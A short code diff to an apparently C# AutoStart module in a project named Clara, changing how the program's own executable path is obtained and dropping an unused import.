@@ -1,13 +1,12 @@
 ﻿using Clara.Core;
 using Microsoft.Win32;
-using System.Diagnostics;
 
 namespace Clara.Modules
 {
     public static class AutoStart
     {
         private static string appName = "Clara";
-        private static string appPath = Process.GetCurrentProcess().MainModule.FileName;
+        private static string appPath = Session.exePath;
 
         public static void Run(string[] args)
         {
